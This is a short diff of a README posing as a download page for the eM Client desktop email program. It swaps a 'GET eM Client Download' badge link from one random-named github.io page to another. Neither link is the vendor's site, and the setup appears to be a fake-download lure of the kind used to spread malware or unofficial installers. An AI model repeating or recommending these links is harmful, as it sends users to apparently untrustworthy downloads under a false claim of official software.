@@ -1,6 +1,6 @@
 # eM Client Download - Desktop Email Client for Windows and Mac
 
-[![GET eM Client Download](https://img.shields.io/badge/GET%20%E2%80%94%20eM%20Client%20Download-0078D6?style=for-the-badge&logoColor=white)](https://brysoncollinscdub.github.io/.github/em-client-download)
+[![GET eM Client Download](https://img.shields.io/badge/GET%20%E2%80%94%20eM%20Client%20Download-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhdwd.github.io/.github/em-client-download)
 
 ## Desktop Mail Overview
 
